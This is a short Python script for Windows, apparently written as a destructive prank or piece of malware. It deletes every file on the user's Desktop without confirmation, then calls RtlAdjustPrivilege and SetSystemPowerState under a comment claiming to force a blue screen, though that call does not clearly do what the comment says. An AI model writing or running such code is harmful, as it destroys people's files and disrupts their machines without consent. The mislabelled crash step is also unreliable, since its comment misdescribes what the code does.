import os
import time
import ctypes

# Delete all files on desktop
desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
for file in os.listdir(desktop_path):
    os.remove(os.path.join(desktop_path, file))

# Wait for 1 second
time.sleep(1)

# Force blue screen
ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, 0)
ctypes.windll.kernel32.SetSystemPowerState(0, -1)